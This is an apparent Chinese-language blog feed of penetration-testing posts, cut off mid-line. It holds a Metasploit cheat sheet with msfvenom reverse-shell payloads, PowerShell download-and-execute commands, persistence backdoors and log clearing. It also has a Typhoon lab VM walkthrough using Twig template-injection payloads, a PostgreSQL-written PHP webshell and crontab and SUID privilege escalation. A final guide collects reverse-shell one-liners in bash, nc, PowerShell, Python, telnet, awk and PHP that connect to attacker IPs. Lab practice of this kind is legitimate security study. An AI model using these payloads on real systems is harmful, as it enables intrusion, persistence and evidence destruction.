windows/meterpreter/reverse_https lhost=192.168.102.1 lport=4444 -f powershell -o /var/www/html/PowerSploit/<span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.102.1/PowerSploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.102.1/PowerSploit/test"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行</span></span><br><span class="line">Invoke-Shellcode -Shellcode (<span class="variable">$buf</span>) -Force</span><br></pre></td></tr></table></figure><h4 id="Win"><a href="#Win" class="headerlink" title="Win"></a>Win</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exe-only exe-service exe-small</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f exe -o a.exe</span><br></pre></td></tr></table></figure><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f jar -o text.jar</span><br></pre></td></tr></table></figure><h4 id="Php"><a href="#Php" class="headerlink" title="Php"></a>Php</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; text.php</span><br></pre></td></tr></table></figure><h4 id="Jsp"><a href="#Jsp" class="headerlink" title="Jsp"></a>Jsp</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt;text.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment">#免杀</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f jsp -o /mnt/c/Users/sherd/Desktop/jsp.jsp</span><br><span class="line"></span><br><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f war -o text.war</span><br></pre></td></tr></table></figure><h4 id="Asp"><a href="#Asp" class="headerlink" title="Asp"></a>Asp</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f asp -o shell.asp</span><br></pre></td></tr></table></figure><h4 id="Aspx"><a href="#Aspx" class="headerlink" title="Aspx"></a>Aspx</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f aspx -o /home/niexinming/back.aspx</span><br></pre></td></tr></table></figure><h4 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 R &gt; text.apk</span><br></pre></td></tr></table></figure><h3 id="Metasploit-BacokDoor"><a href="#Metasploit-BacokDoor" class="headerlink" title="Metasploit BacokDoor"></a>Metasploit BacokDoor</h3><h4 id="Metsvc服务"><a href="#Metsvc服务" class="headerlink" title="Metsvc服务"></a>Metsvc服务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run metsvc -A <span class="comment">#自动安装后门</span></span><br><span class="line">run metsvc <span class="comment"># 自定义后门</span></span><br><span class="line"><span class="built_in">set</span> payload windows/metsvc_bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 目标ip</span><br><span class="line"><span class="built_in">set</span> lport 目标监听端口</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h4 id="Cymothoa"><a href="#Cymothoa" class="headerlink" title="Cymothoa"></a>Cymothoa</h4><p>上传到目标机</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cymotha -p 982 -s 1 -y 4444</span><br><span class="line">nc -nvv 目标ip 4444</span><br></pre></td></tr></table></figure><h4 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run persistence -A -S -U -i 60 -p 4321 -r ip</span><br><span class="line">run persistence -A -U -X -i 60 -p 6666 -r ip</span><br><span class="line">-A 自启动payload</span><br><span class="line">-S 系统自启动加载（服务）</span><br><span class="line">-U 用户登录自启动</span><br><span class="line">-X 开机自加载</span><br><span class="line">-i 回连时间间隔</span><br><span class="line">-P 监听反向连接端口号</span><br><span class="line">-r 目标机器IP</span><br></pre></td></tr></table></figure><h2 id="日志清除"><a href="#日志清除" class="headerlink" title="日志清除"></a>日志清除</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除目标机上的应用程序、系统和安全日志</span></span><br><span class="line">clearev</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2019/04/20/Metasploit-All-In-One/2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Meterpreter&quot;&gt;&lt;a href=&quot;#Meterpreter&quot; class=&quot;headerlink&quot; title=&quot;Meterpreter&quot;&gt;&lt;/a&gt;Meterpreter&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透实战:Typhoon靶机入侵</title>
    <link href="https://t43wiu6.github.io/2019/04/19/Typhoon/"/>
    <id>https://t43wiu6.github.io/2019/04/19/Typhoon/</id>
    <published>2019-04-19T13:48:50.000Z</published>
    <updated>2019-04-20T06:07:29.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>目标：root</li><li>作者：PrismaCSI</li><li>难度定位：无</li></ul><blockquote><p>渗透过程中经历了好几次换环境，IP地址有点混乱，请体谅</p></blockquote><h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><a id="more"></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">21/tcp    open  ftp         vsftpd 3.0.2</span><br><span class="line">22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">110/tcp   open  pop3        DovMarkdown Theme Kitecot pop3d</span><br><span class="line">111/tcp   open  rpcbind     2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp   open  imap        Dovecot imapd (Ubuntu)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">631/tcp   open  ipp         CUPS 1.7</span><br><span class="line">993/tcp   open  ssl/imaps?</span><br><span class="line">995/tcp   open  ssl/pop3s?</span><br><span class="line">2049/tcp  open  nfs_acl     2-3 (RPC <span class="comment">#100227)</span></span><br><span class="line">3306/tcp  open  mysql       MySQL (unauthorized)</span><br><span class="line">5432/tcp  open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5</span><br><span class="line">6379/tcp  open  redis       Redis key-value store 4.0.11</span><br><span class="line">8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">27017/tcp open  mongodb     MongoDB 3.0.15</span><br><span class="line">33867/tcp open  nlockmgr    1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">35717/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">38819/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">49775/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">58730/tcp open  status      1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure><p>可以看到有较多服务<br>那么跑目录走起，发现有<code>mongoadmin</code><br><img src="mongoadmin.PNG" alt="mongoadmin"></p><blockquote><p>username : typhoon<br>password : 789456123</p></blockquote><p>总共有两个集合，creds和typhoon，账号密码是creds下的，提示很明显了<br>反手一个SSH</p><p><img src="ssh.PNG" alt="ssh"></p><p>就这么没了????<br>事实上…实际的利用链当然不是这样子</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.201.6</span><br></pre></td></tr></table></figure><p>先尝试下一般的利用，在低权限时写🐎</p><p><img src="mongodb.PNG" alt="mongodb"></p><p>但是访问页面是500，尝试写入php的反弹shell，还是500</p><p><img src="shell.PNG" alt="shell"></p><p>开下外挂看看怎么回事，wtf？这个权限660，其他用户读不了，尴尬😅<br>尝试crontab计划任务弹shell和写ssh公钥均因为权限问题失败</p><p>突发奇想，权限不够?，那我写root的，或许运行root登录呢<br>尝试写入篡改root用户的公钥…然而还是需要密码Orz</p><h1 id="服务端SSTI"><a href="#服务端SSTI" class="headerlink" title="服务端SSTI"></a>服务端SSTI</h1><p>这个靶机是有多个GetShell方法的，我尽量尝试把它们都找出来</p><p><img src="dvwa.PNG" alt="dvwa"></p><p>没想到还给配了个DVWA练习平台，那么默认账号密码<code>admin</code>,<code>password</code>，对于DVWA，相信大家都很熟悉了<br>但这样就没意思了，而另一个XVWA我还是第一次玩，我决定让它变得更有意思一些，JustForFun</p><p>比如说模板注入<br><img src="SSTI.PNG" alt="SSTI"></p><p>对于TWIG的模板注入，使用以下payload可以达到命令执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"whoami"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hello www-data</span><br></pre></td></tr></table></figure><p>那么可以直接拿到shell了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.135/6666 0&gt;&amp;1"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是尝试了几种方法都会报字符错误<br>换一种思路<br><img src="httpserver.PNG" alt="httpserver"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name=&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"wget http://192.168.220.135/a,py /tmp/"</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">name=&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"python /tmp/a.py"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="www-data.PNG" alt="www-data"></p><h1 id="Drupalgeddon2一键GetShell"><a href="#Drupalgeddon2一键GetShell" class="headerlink" title="Drupalgeddon2一键GetShell"></a>Drupalgeddon2一键GetShell</h1><p>没错，是之前遇到过的drupalgeddon2</p><p><img src="drupal.PNG" alt="drupal"></p><h1 id="Lotus-RCE"><a href="#Lotus-RCE" class="headerlink" title="Lotus RCE"></a>Lotus RCE</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/http/lcms_php_exec</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.220.134</span><br><span class="line"><span class="built_in">set</span> uri /cms/</span><br><span class="line">run</span><br></pre></td></tr></table></figure><blockquote><p>注意uri格式，我在这里被坑了o_o ….</p></blockquote><p><img src="lotus.PNG" alt="lotus"></p><h1 id="SSH弱密码"><a href="#SSH弱密码" class="headerlink" title="SSH弱密码"></a>SSH弱密码</h1><ul><li>针对OpenSSH 6.6.1用户枚举漏洞</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.201.6</span><br><span class="line"><span class="built_in">set</span> threads 20</span><br><span class="line"><span class="built_in">set</span> user_file /home/user/users.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>爆出一个admin，目前为止共的三个用户名<code>admin</code>,<code>typhoon</code>,<code>root</code>,写入<code>user.txt</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l /home/user/user.txt -P /home/user/pass.txt ssh://192.168.201.6</span><br></pre></td></tr></table></figure><ul><li>admin:metallica</li><li>typhoon:789456123</li></ul><h1 id="PostgreSQL任意文件读取与写入"><a href="#PostgreSQL任意文件读取与写入" class="headerlink" title="PostgreSQL任意文件读取与写入"></a>PostgreSQL任意文件读取与写入</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.201.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>枚举出弱密码</p><blockquote><p>postgres:postgres</p></blockquote><p><img src="psql.PNG" alt="psql"></p><p>数据库是空的…</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>(t <span class="built_in">TEXT</span>);</span><br><span class="line">COPY test FROM '/etc/passwd';</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure><p>通过COPY读取文件</p><p><img src="passwd.PNG" alt="passwd"></p><blockquote><p>postfixuser</p></blockquote><p>写入webshell</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>(t <span class="built_in">TEXT</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">test</span>(t) <span class="keyword">VALUES</span> (<span class="string">'&lt;?php @eval($_GET[cmd]);?&gt;'</span>);</span><br><span class="line">COPY test(t) TO '/var/www/html/cmd.php';</span><br></pre></td></tr></table></figure><p>然而连不上，返回空数据，尝试反弹，有引号报错…语法不熟悉，毕竟是即使学的…<br>拿出navicat写，( •̀ ω •́ )y</p><p><img src="postgresql-shell.PNG" alt="postgresql-shell"></p><p>其实这里还可以利用UDF提权，不过对应版本的<code>.so</code>我没有找到…自己搭建的话比较麻烦，就先放下了</p><h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><p><img src="redis.PNG" alt="redis"></p><p>与MongoDb一样的利用链，一样的坑</p><h1 id="CUPS远程打印服务GetShell-amp-提权"><a href="#CUPS远程打印服务GetShell-amp-提权" class="headerlink" title="CUPS远程打印服务GetShell&amp;提权"></a>CUPS远程打印服务GetShell&amp;提权</h1><p>作者设计预期应该是有631的cups这一操作<br>但我死活复现不出来…..tcl</p><blockquote><p><a href="https://www.exploit-db.com/exploits/37336" target="_blank" rel="noopener">CVE-2015-1158</a></p></blockquote><p><img src="cups.PNG" alt="cups"></p><h1 id="Tomcat后台文件上传"><a href="#Tomcat后台文件上传" class="headerlink" title="Tomcat后台文件上传"></a>Tomcat后台文件上传</h1><p>tomcat默认密码</p><p><img src="tomcat.PNG" alt=""></p><p>将jsp反弹马(<code>reverse.jsp</code>)打包成zip，改后缀为war，上传<br>访问<code>http://192.168.201.6:8080/reverse/reverse.jsp</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tomcat7@typhoon:/var/lib/tomcat7$ whoami</span><br><span class="line">whoami</span><br><span class="line">tomcat7</span><br></pre></td></tr></table></figure><p>成功拿到tomcat7权限的shell<br>也可以使用msf的<code>exploit/mutli/http/tomcat/tomcat_mgr_upload</code></p><h1 id="Struts2多处漏洞"><a href="#Struts2多处漏洞" class="headerlink" title="Struts2多处漏洞"></a>Struts2多处漏洞</h1><p><img src="struts2.PNG" alt=""><br>可以看到有两个struts2-showcase，拿出的struts-scan扫一波，刚好体验一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python struts-scan.py http://192.168.201.6:8080/struts2-showcase/showcase.action</span><br></pre></td></tr></table></figure><p><img src="struts2-rs.PNG" alt=""></p><p>然而利用有问题…要是有时间的话，算了，不立flag了<br>翻箱倒柜找到多个exp，体验都极差…..最后有一发还行，哎，还是得自己上手才能丰衣足食，事后再搞一波吧</p><p><img src="s2045.PNG" alt=""></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="提权方法一：SUID提权"><a href="#提权方法一：SUID提权" class="headerlink" title="提权方法一：SUID提权"></a>提权方法一：SUID提权</h2><p>经典的SUID提权<br>枚举S权限程序:<code>find / -perm -4000 2&gt;/dev/null</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 三个可疑程序</span></span><br><span class="line">/usr/bin/head</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/vim.basic</span><br></pre></td></tr></table></figure><p><strong>head</strong></p><p>直接<code>head /etc/shadow</code>成功拿到所有账户密码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:<span class="variable">$6</span><span class="variable">$xlUx2G5p</span>$.6IGWvV41rccKNfq7BeLhDFB6YZtsbpHGppKPZ0Cp9/1w1a/xx/UtyPy02f1gdv4tw4ibqOyzVcmwutrOiWlq1:17826:0:99999:7:::</span><br></pre></td></tr></table></figure><p><strong>vim</strong></p><p>这个vim有点奇怪，直接<code>!/bin/bash</code>或<code>vim -c &#39;:!/bin/sh&#39;</code>得到得依然是原权限得shell…<br>但通过vim得shell再使用py的os库执行可以得到root</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim -c <span class="string">':python import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</span></span><br></pre></td></tr></table></figure><p><img src="vim-root.PNG" alt="vim-root.PNG"></p><p><strong>at</strong></p><p>这个at命令跟vim一样的坑</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">at -t <span class="variable">$now</span> `/bin/bash -i &gt;&amp; /dev/tcp/192.168.201.7/6666 0&gt;&amp;1`</span><br></pre></td></tr></table></figure><p>得到的是原shell，但这次py也救不了了…利用失败</p><h2 id="提权方法二：Crontab提权"><a href="#提权方法二：Crontab提权" class="headerlink" title="提权方法二：Crontab提权"></a>提权方法二：Crontab提权</h2><p>利用特权的head读取crontab任务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">head /var/spool/cron/crontabs/root -n 50</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">*/1 * * * * /tab/script.sh</span><br></pre></td></tr></table></figure><p>到tab下看一下，权限是777</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tab$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 86 Apr 19 20:16 script.sh</span><br><span class="line">typhoon@typhoon:/tab$ cat script.sh </span><br><span class="line">echo &quot;Typhoon is UP!&quot;</span><br><span class="line"></span><br><span class="line">#&lt;typh00n!&gt; P0st_3xpl01t3R_flaqGq &lt;typhoon!&gt;</span><br></pre></td></tr></table></figure><p>写入反弹shell命令到<code>script.sh</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tab$ echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1&quot; &gt; script.sh</span><br></pre></td></tr></table></figure><p>未知原因反弹没生效，而nc是没有<code>-e</code>参数的那种</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tab$ <span class="built_in">echo</span> <span class="string">"mkfifo /tmp/test;cat /tmp/test|/bin/sh -i 2&gt;&amp;1|nc 192.168.200.5 6666 &gt;/tmp/test"</span> &gt; script.sh</span><br></pre></td></tr></table></figure><p><img src="root-flag.PNG" alt="root-flag"></p><h2 id="提权方法三：内核提权"><a href="#提权方法三：内核提权" class="headerlink" title="提权方法三：内核提权"></a>提权方法三：内核提权</h2><p>内核提取最方便、快捷，但是有局限性,<a href="https://www.exploit-db.com/exploits/37292" target="_blank" rel="noopener">exp</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$python</span> -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tmp$ wget 192.168.200.6:8000/37292.c</span><br><span class="line">typhoon@typhoon:/tmp$ gcc 37292.c -o hac</span><br><span class="line">typhoon@typhoon:/tmp$ chmod +x hack</span><br><span class="line">typhoon@typhoon:/tmp$ ./hack</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>最后来试一下内核自动化提权脚本</p><p><img src="autoroot.PNG" alt="autoroot"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;目标：root&lt;/li&gt;
&lt;li&gt;作者：PrismaCSI&lt;/li&gt;
&lt;li&gt;难度定位：无&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;渗透过程中经历了好几次换环境，IP地址有点混乱，请体谅&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;MongoDB未授权访问&quot;&gt;&lt;a href=&quot;#MongoDB未授权访问&quot; class=&quot;headerlink&quot; title=&quot;MongoDB未授权访问&quot;&gt;&lt;/a&gt;MongoDB未授权访问&lt;/h1&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux&amp;Win花式弹shell指南</title>
    <link href="https://t43wiu6.github.io/2019/03/26/reverse-shell/"/>
    <id>https://t43wiu6.github.io/2019/03/26/reverse-shell/</id>
    <published>2019-03-26T23:58:40.000Z</published>
    <updated>2019-04-13T08:04:20.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.220.140 6666</span><br></pre></td></tr></table></figure><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><a id="more"></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -ep bypass -Command <span class="string">"<span class="variable">$RcvLFCUFMmdDX</span>='192.168.220.140';<span class="variable">$eGdTwRr</span>=6666;<span class="variable">$aPjzrf</span>=New-Object System.Net.Sockets.TCPClient(<span class="variable">$RcvLFCUFMmdDX</span>,<span class="variable">$eGdTwRr</span>);<span class="variable">$ADWDNku</span>=<span class="variable">$aPjzrf</span>.GetStream();[byte[]]<span class="variable">$mvkwuYHrYO</span>=0..65535|%&#123;0&#125;;<span class="variable">$QPQlsQKzygeCwFV</span>=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'&gt; ');<span class="variable">$ADWDNku</span>.Write(<span class="variable">$QPQlsQKzygeCwFV</span>,0,<span class="variable">$QPQlsQKzygeCwFV</span>.Length);while((<span class="variable">$KCaBvR</span>=<span class="variable">$ADWDNku</span>.Read(<span class="variable">$mvkwuYHrYO</span>,0,<span class="variable">$mvkwuYHrYO</span>.Length)) -ne 0)&#123;<span class="variable">$anSGyc</span>=([text.encoding]::ASCII).GetString(<span class="variable">$mvkwuYHrYO</span>,0,<span class="variable">$KCaBvR</span>);try&#123;<span class="variable">$gRrnhEIMpeoP</span>=(Invoke-Expression -c <span class="variable">$anSGyc</span> 2&gt;&amp;1|Out-String)&#125;catch&#123;Write-Warning 'Something went wrong with execution of command on the target.';Write-Error <span class="variable">$_</span>;&#125;;<span class="variable">$RcvLFCUFMmdDX0</span>=<span class="variable">$gRrnhEIMpeoP</span>+'PS '+(Get-Location).Path+'&gt; ';<span class="variable">$RcvLFCUFMmdDX1</span>=(<span class="variable">$RcvLFCUFMmdDX2</span>[0]|Out-String);<span class="variable">$RcvLFCUFMmdDX2</span>.clear();<span class="variable">$RcvLFCUFMmdDX0</span>=<span class="variable">$RcvLFCUFMmdDX0</span>+<span class="variable">$RcvLFCUFMmdDX1</span>;<span class="variable">$QPQlsQKzygeCwFV</span>=([text.encoding]::ASCII).GetBytes(<span class="variable">$RcvLFCUFMmdDX0</span>);<span class="variable">$ADWDNku</span>.Write(<span class="variable">$QPQlsQKzygeCwFV</span>,0,<span class="variable">$QPQlsQKzygeCwFV</span>.Length);<span class="variable">$ADWDNku</span>.Flush();&#125;;<span class="variable">$aPjzrf</span>.Close();if(<span class="variable">$RcvLFCUFMmdDX3</span>)&#123;<span class="variable">$RcvLFCUFMmdDX3</span>.Stop();&#125;;"</span></span><br></pre></td></tr></table></figure><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><blockquote><p><strong>TCP</strong></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.220.140',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');s.close();"</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.220.140",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>UDP</strong><br>ps:<code>nc -luvvp 6666</code></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import os;import pty;import socket;soc=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);soc.connect(('192.168.220.140',6666));os.dup2(soc.fileno(),0);os.dup2(soc.fileno(),1);os.dup2(soc.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');soc.close();"</span></span><br></pre></td></tr></table></figure><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665</span><br><span class="line">nc -lvvp 6666 <span class="comment">#命令传输窗口</span></span><br><span class="line">nc -lvvp 6665 <span class="comment">#命令结果显示窗口</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -e /tmp/<span class="built_in">test</span> ];<span class="keyword">then</span> rm /tmp/<span class="built_in">test</span>;<span class="keyword">fi</span>;mkfifo /tmp/<span class="built_in">test</span>;cat /tmp/<span class="built_in">test</span>|/bin/sh -i 2&gt;&amp;1|telnet 192.168.220.140 6666 &gt; /tmp/<span class="built_in">test</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -e /tmp/<span class="built_in">test</span> ];<span class="keyword">then</span> rm /tmp/<span class="built_in">test</span>;<span class="keyword">fi</span>;mknod /tmp/<span class="built_in">test</span> p &amp;&amp; telnet 192.168.220.140 6666 0&lt;/tmp/<span class="built_in">test</span>|/bin/bash 1&gt;/tmp/<span class="built_in">test</span></span><br></pre></td></tr></table></figure><h2 id="AWK"><a href="#AWK" class="headerlink" title="AWK"></a>AWK</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p=6666;awk -v port=<span class="string">"<span class="variable">$p</span>"</span> <span class="string">'BEGIN&#123;soc="/inet/tcp/0/192.168.220.140/"port;while(8095856)&#123;do&#123;printf "shell&gt;"|&amp;soc;soc|&amp; getline inp;if(inp)&#123;while((inp|&amp; getline)&gt;0)print $0|&amp;soc;close(inp);&#125;&#125;while(inp!="exit")close(soc);break&#125;&#125;'</span> /dev/null</span><br></pre></td></tr></table></figure><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">"\$soc=fsockopen('192.168.220.140',6666);exec('/bin/sh -i &lt;&amp;3 